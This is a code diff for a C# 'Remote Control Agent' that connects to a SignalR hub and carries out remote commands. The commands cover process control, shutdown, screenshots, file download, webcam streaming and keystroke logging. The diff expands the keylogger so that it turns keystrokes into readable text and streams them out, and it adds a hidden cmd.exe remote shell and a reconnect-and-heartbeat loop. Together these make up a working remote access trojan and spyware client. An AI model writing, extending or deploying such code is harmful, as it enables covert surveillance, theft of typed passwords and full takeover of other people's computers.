@@ -20,7 +20,7 @@ namespace AgentApp
         private static extern short GetAsyncKeyState(int vKey);
 
         private static bool _isKeylogging = false;
-        
+
         // For Webcam Streaming
         private static VideoCaptureDevice _videoSource;
         private static HubConnection _connection;
@@ -30,12 +30,13 @@ namespace AgentApp
         {
             Console.WriteLine("Starting Remote Control Agent...");
             // Allow passing Hub IP/URL via command line arguments
-            var hubUrl = args.Length > 0 ? args[0] : "http://localhost:5000/remoteHub"; 
+            var hubUrl = args.Length > 0 ? args[0] : "http://localhost:5000/remoteHub";
             Console.WriteLine($"Connecting to {hubUrl}...");
 
             _connection = new HubConnectionBuilder()
-                .WithUrl(hubUrl, options => 
+                .WithUrl(hubUrl, options =>
                 {
+                    options.Transports = Microsoft.AspNetCore.Http.Connections.HttpTransportType.WebSockets;
                     options.HttpMessageHandlerFactory = handler =>
                     {
                         if (handler is System.Net.Http.HttpClientHandler clientHandler)
@@ -56,14 +57,15 @@ namespace AgentApp
             };
 
             // Register handlers for Hub commands
-            _connection.On("GetProcessesCommand", async () => 
+            _connection.On("GetProcessesCommand", async () =>
             {
                 Console.WriteLine("Command Received: GetProcessesCommand");
                 try
                 {
                     var processes = Process.GetProcesses()
                         .Where(p => p.MainWindowHandle != IntPtr.Zero || p.ProcessName == "explorer")
-                        .Select(p => new {
+                        .Select(p => new
+                        {
                             Id = p.Id,
                             Name = p.ProcessName,
                             Threads = p.Threads.Count
@@ -78,7 +80,7 @@ namespace AgentApp
                 }
             });
 
-            _connection.On<int>("KillProcessCommand", (processId) => 
+            _connection.On<int>("KillProcessCommand", (processId) =>
             {
                 Console.WriteLine($"Command Received: KillProcessCommand for PID {processId}");
                 try
@@ -94,7 +96,7 @@ namespace AgentApp
             });
 
             // --- NEW: Applications Management ---
-            _connection.On("GetApplicationsCommand", async () => 
+            _connection.On("GetApplicationsCommand", async () =>
             {
                 Console.WriteLine("Command Received: GetApplicationsCommand");
                 try
@@ -102,7 +104,8 @@ namespace AgentApp
                     // Filter processes that actually have a GUI Window
                     var apps = Process.GetProcesses()
                         .Where(p => p.MainWindowHandle != IntPtr.Zero && !string.IsNullOrEmpty(p.MainWindowTitle))
-                        .Select(p => new {
+                        .Select(p => new
+                        {
                             Id = p.Id,
                             Name = p.ProcessName,
                             Title = p.MainWindowTitle
@@ -117,7 +120,7 @@ namespace AgentApp
                 }
             });
 
-            _connection.On<string>("StartAppCommand", (appPath) => 
+            _connection.On<string>("StartAppCommand", (appPath) =>
             {
                 Console.WriteLine($"Command Received: StartAppCommand for {appPath}");
                 try
@@ -132,20 +135,20 @@ namespace AgentApp
             });
 
             // --- NEW: Power Management ---
-            _connection.On("ShutdownCommand", () => 
+            _connection.On("ShutdownCommand", () =>
             {
                 Console.WriteLine("Command Received: ShutdownCommand");
                 try { Process.Start("shutdown.exe", "/s /t 0"); } catch { }
             });
 
-            _connection.On("RestartCommand", () => 
+            _connection.On("RestartCommand", () =>
             {
                 Console.WriteLine("Command Received: RestartCommand");
                 try { Process.Start("shutdown.exe", "/r /t 0"); } catch { }
             });
 
             // --- NEW: Screen Capture ---
-            _connection.On("TakeScreenshotCommand", async () => 
+            _connection.On("TakeScreenshotCommand", async () =>
             {
                 Console.WriteLine("Command Received: TakeScreenshotCommand");
                 try
@@ -153,24 +156,24 @@ namespace AgentApp
                     // Create a bitmap of the primary screen bounds
                     // Note: In real app we might want all screens, but primary is good for MVP
                     Rectangle bounds = new Rectangle(0, 0, 1920, 1080); // Default fallback
-                    
+
                     // Use System.Windows.Forms.Screen if available in net8.0-windows, else fallback
                     var screenBounds = System.Windows.Forms.Screen.PrimaryScreen?.Bounds ?? bounds;
-                    
+
                     using (Bitmap bitmap = new Bitmap(screenBounds.Width, screenBounds.Height))
                     {
                         using (Graphics g = Graphics.FromImage(bitmap))
                         {
                             g.CopyFromScreen(Point.Empty, Point.Empty, screenBounds.Size);
                         }
-                        
+
                         using (MemoryStream ms = new MemoryStream())
                         {
                             // Save as JPEG to reduce payload size over SignalR
                             bitmap.Save(ms, ImageFormat.Jpeg);
                             byte[] imageBytes = ms.ToArray();
                             string base64String = Convert.ToBase64String(imageBytes);
-                            
+
                             await _connection.InvokeAsync("SendScreenshotResult", "", base64String);
                         }
                     }
@@ -182,7 +185,7 @@ namespace AgentApp
             });
 
             // --- NEW: File Download ---
-            _connection.On<string>("DownloadFileCommand", async (filePath) => 
+            _connection.On<string>("DownloadFileCommand", async (filePath) =>
             {
                 Console.WriteLine($"Command Received: DownloadFileCommand for {filePath}");
                 try
@@ -206,26 +209,92 @@ namespace AgentApp
                 }
             });
 
-            // --- NEW: Keylogger ---
-            _connection.On("StartKeyloggerCommand", () => 
+            _connection.On("StartKeyloggerCommand", () =>
             {
                 Console.WriteLine("Command Received: StartKeyloggerCommand");
-                if(!_isKeylogging)
+                if (!_isKeylogging)
                 {
                     _isKeylogging = true;
                     // Run a background thread to poll keys
-                    Task.Run(async () => {
+                    Task.Run(async () =>
+                    {
                         while (_isKeylogging)
                         {
                             for (int i = 8; i <= 255; i++)
                             {
                                 int keyState = GetAsyncKeyState(i);
                                 // The most significant bit is set if the key is down
-                                if ((keyState & 1) == 1 || keyState == -32767) 
+                                if ((keyState & 1) == 1 || keyState == -32767)
                                 {
-                                    string keyName = ((ConsoleKey)i).ToString();
-                                    // Send key immediately 
-                                    await _connection.InvokeAsync("SendKeylogData", "", $"[{keyName}]");
+                                    // Filter out modifier keys themselves to avoid noise
+                                    if (i == 16 || i == 17 || i == 18 || i == 20 || i == 27 || i == 91 || i == 92 || i == 231 || (i >= 160 && i <= 165))
+                                    {
+                                        continue;
+                                    }
+
+                                    string keyOutput = "";
+                                    ConsoleKey key = (ConsoleKey)i;
+
+                                    bool isShift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
+                                    bool isCtrl = (GetAsyncKeyState(0x11) & 0x8000) != 0;
+                                    bool isAlt = (GetAsyncKeyState(0x12) & 0x8000) != 0;
+
+                                    string prefix = "";
+                                    if (isCtrl) prefix += "Ctrl+";
+                                    if (isAlt) prefix += "Alt+";
+
+                                    if (isCtrl || isAlt)
+                                    {
+                                        string keyName = key.ToString();
+                                        if (i >= 48 && i <= 57) keyName = keyName.Replace("D", "");
+                                        else if (key == ConsoleKey.Backspace) keyName = "BS";
+                                        else if (key == ConsoleKey.Enter) keyName = "Enter";
+                                        else if (key == ConsoleKey.Spacebar) keyName = "Space";
+                                        else if (key == ConsoleKey.Tab) keyName = "Tab";
+
+                                        if (isShift) prefix += "Shift+";
+                                        keyOutput = $"[{prefix}{keyName}]";
+                                    }
+                                    else
+                                    {
+                                        if (key == ConsoleKey.Spacebar) keyOutput = " ";
+                                        else if (key == ConsoleKey.Enter) keyOutput = "\n";
+                                        else if (key == ConsoleKey.Backspace) keyOutput = "\b";
+                                        else if (key == ConsoleKey.Tab) keyOutput = "[TAB]";
+                                        else if (i >= 48 && i <= 90) // 0-9 and A-Z
+                                        {
+                                            string letter = key.ToString();
+                                            if (letter.Length == 1)
+                                            {
+                                                keyOutput = isShift ? letter.ToUpper() : letter.ToLower();
+                                            }
+                                            else
+                                            {
+                                                // Handle D0-D9
+                                                if (letter.StartsWith("D") && letter.Length == 2 && char.IsDigit(letter[1]))
+                                                {
+                                                    keyOutput = letter.Substring(1);
+                                                }
+                                                else
+                                                {
+                                                    keyOutput = letter;
+                                                }
+                                            }
+                                        }
+                                        else if (i >= 96 && i <= 105) // Numpad
+                                        {
+                                            keyOutput = (i - 96).ToString();
+                                        }
+                                        else
+                                        {
+                                            keyOutput = $"[{key}]";
+                                        }
+                                    }
+
+                                    if (!string.IsNullOrEmpty(keyOutput))
+                                    {
+                                        await _connection.InvokeAsync("SendKeylogData", "", keyOutput);
+                                    }
                                 }
                             }
                             await Task.Delay(10); // Polling interval
@@ -234,18 +303,60 @@ namespace AgentApp
                 }
             });
 
-            _connection.On("StopKeyloggerCommand", () => 
+            _connection.On("StopKeyloggerCommand", () =>
             {
                 Console.WriteLine("Command Received: StopKeyloggerCommand");
                 _isKeylogging = false;
             });
 
+            // --- NEW: Terminal ---
+            _connection.On<string>("ExecuteTerminalCommand", async (command) =>
+            {
+                Console.WriteLine($"Command Received: ExecuteTerminalCommand for: {command}");
+                try
+                {
+                    var processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
+                    {
+                        CreateNoWindow = true,
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) ?? "C:\\"
+                    };
+
+                    var process = Process.Start(processInfo);
+                    if (process != null)
+                    {
+                        string output = await process.StandardOutput.ReadToEndAsync();
+                        string error = await process.StandardError.ReadToEndAsync();
+                        await process.WaitForExitAsync();
+
+                        string result = output;
+                        if (!string.IsNullOrEmpty(error))
+                        {
+                            result += "\n[Error]\n" + error;
+                        }
+                        if (string.IsNullOrEmpty(result))
+                        {
+                            result = "[Command executed with no output]";
+                        }
+
+                        await _connection.InvokeAsync("SendTerminalOutput", "", result);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error executing command: {ex.Message}");
+                    await _connection.InvokeAsync("SendTerminalOutput", "", $"Error: {ex.Message}");
+                }
+            });
+
             // --- NEW: Webcam Stream ---
-            _connection.On("StartWebcamCommand", () => 
+            _connection.On("StartWebcamCommand", () =>
             {
                 Console.WriteLine("Command Received: StartWebcamCommand");
-                
-                try 
+
+                try
                 {
                     FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                     if (videoDevices.Count > 0)
@@ -255,14 +366,14 @@ namespace AgentApp
                             var device = videoDevices[0];
                             Console.WriteLine($"Found camera: {device.Name}");
                             _videoSource = new VideoCaptureDevice(device.MonikerString);
-                            
+
                             // Optional: Lower resolution to save bandwidth
                             if (_videoSource.VideoCapabilities.Length > 0)
                             {
                                 _videoSource.VideoResolution = _videoSource.VideoCapabilities.OrderBy(v => v.FrameSize.Width).First();
                                 Console.WriteLine($"Camera resolution set to: {_videoSource.VideoResolution.FrameSize.Width}x{_videoSource.VideoResolution.FrameSize.Height}");
                             }
-                            
+
                             _videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                             _videoSource.VideoSourceError += new VideoSourceErrorEventHandler(video_VideoSourceError);
                         }
@@ -286,10 +397,10 @@ namespace AgentApp
                 }
             });
 
-            _connection.On("StopWebcamCommand", () => 
+            _connection.On("StopWebcamCommand", () =>
             {
                 Console.WriteLine("Command Received: StopWebcamCommand");
-                try 
+                try
                 {
                     if (_videoSource != null && _videoSource.IsRunning)
                     {
@@ -306,16 +417,33 @@ namespace AgentApp
                 }
             });
 
-            try
+            // Start heartbeat and connection loop
+            _ = Task.Run(async () =>
             {
-                await _connection.StartAsync();
-                Console.WriteLine("Connected to Hub successfully!");
-                await _connection.InvokeAsync("RegisterAgent", Environment.MachineName);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error starting connection. Is WebApp running? {ex.Message}");
-            }
+                while (true)
+                {
+                    try
+                    {
+                        if (_connection.State == HubConnectionState.Disconnected)
+                        {
+                            Console.WriteLine("Attempting to connect to Hub...");
+                            await _connection.StartAsync();
+                            Console.WriteLine("Connected to Hub successfully!");
+                            await _connection.InvokeAsync("RegisterAgent", Environment.MachineName);
+                        }
+                        else if (_connection.State == HubConnectionState.Connected)
+                        {
+                            // Send Heartbeat every 10s
+                            await _connection.InvokeAsync("Heartbeat", Environment.MachineName);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"Connection or heartbeat error. Retrying in 10s... ({ex.Message})");
+                    }
+                    await Task.Delay(10000); // 10 seconds
+                }
+            });
 
             Console.WriteLine("Agent is running... Press Ctrl+C to exit.");
             await Task.Delay(-1);
@@ -342,7 +470,7 @@ namespace AgentApp
                         {
                             // Fire and forget so we don't hold up the camera thread
                             _ = _connection.InvokeAsync("SendWebcamFrame", "", base64String);
-                            
+
                             if (!_firstFrameSent)
                             {
                                 Console.WriteLine("Thành công! Frame hình ảnh đầu tiên đã được gửi đi. Camera đang stream.");
